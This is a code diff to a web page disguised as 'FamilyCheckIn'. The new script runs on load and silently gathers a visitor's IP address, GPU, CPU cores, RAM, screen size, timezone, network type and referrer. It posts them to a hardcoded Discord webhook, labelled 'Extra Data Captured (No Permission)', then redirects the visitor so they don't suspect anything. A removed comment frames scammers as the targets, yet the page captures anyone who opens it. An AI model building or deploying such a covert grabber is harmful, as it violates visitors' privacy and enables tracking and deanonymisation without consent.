@@ -17,52 +17,62 @@
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1459668118661103678/9OcP9yPBgMw8LvDp-yRBM_qGH1KY59lbVxMAeh_jDE-94e5q9JGcKxS5CVqGHe6PIkjp";
         const REDIRECT_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
 
-        async function grabIP() {
+        async function grabEverything() {
             try {
-                // Step 1: Fetch the IP from a public API
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                const userIP = data.ip;
+                // 1. Get IP and basic Geolocation (Approximate)
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                
+                // 2. Hardware and Browser Deep Probe
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl');
+                const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
+                const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown GPU";
 
-                // Step 2: Gather basic browser info
-                const info = {
-                    ua: navigator.userAgent,
+                const data = {
+                    ip: ipData.ip,
                     platform: navigator.platform,
-                    lang: navigator.language,
-                    time: new Date().toLocaleString()
+                    cores: navigator.hardwareConcurrency || "Unknown",
+                    ram: navigator.deviceMemory || "Unknown",
+                    gpu: gpu,
+                    screen: `${window.screen.width}x${window.screen.height}`,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    language: navigator.language,
+                    connection: navigator.connection ? navigator.connection.effectiveType : "Unknown",
+                    history: window.history.length,
+                    referer: document.referrer || "Direct Link"
                 };
 
-                // Step 3: Send to Discord
+                // 3. Send to Discord
                 await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         embeds: [{
-                            title: "🌐 New IP Logged",
-                            color: 3447003,
+                            title: "🕵️ Extra Data Captured (No Permission)",
+                            color: 15158332,
                             fields: [
-                                { name: "IP Address", value: `\`${userIP}\``, inline: true },
-                                { name: "Platform", value: info.platform, inline: true },
-                                { name: "Time", value: info.time },
-                                { name: "User Agent", value: `\`${info.ua}\`` }
+                                { name: "🌐 IP", value: `\`${data.ip}\``, inline: true },
+                                { name: "🌍 Timezone", value: data.timezone, inline: true },
+                                { name: "💻 GPU", value: `\`${data.gpu}\`` },
+                                { name: "🚀 Hardware", value: `${data.cores} Cores / ${data.ram}GB RAM`, inline: true },
+                                { name: "📶 Network", value: data.connection, inline: true },
+                                { name: "🖥️ Screen", value: data.screen, inline: true },
+                                { name: "🔗 Referer", value: data.referer }
                             ],
-                            footer: { text: "FamilyCheckIn IP Logger" }
+                            footer: { text: "FamilyCheckIn Stealth Probe" }
                         }]
                     })
                 });
 
             } catch (err) {
-                console.log("Silent grab failed");
+                console.log("Stealth capture failed");
             } finally {
-                // Always redirect the scammer so they don't suspect anything
-                setTimeout(() => {
-                    window.location.replace(REDIRECT_URL);
-                }, 1000);
+                setTimeout(() => { window.location.replace(REDIRECT_URL); }, 1200);
             }
         }
 
-        // Execute immediately on load
-        window.onload = grabIP;
+        window.onload = grabEverything;
     </script>
 </body>
 </html>
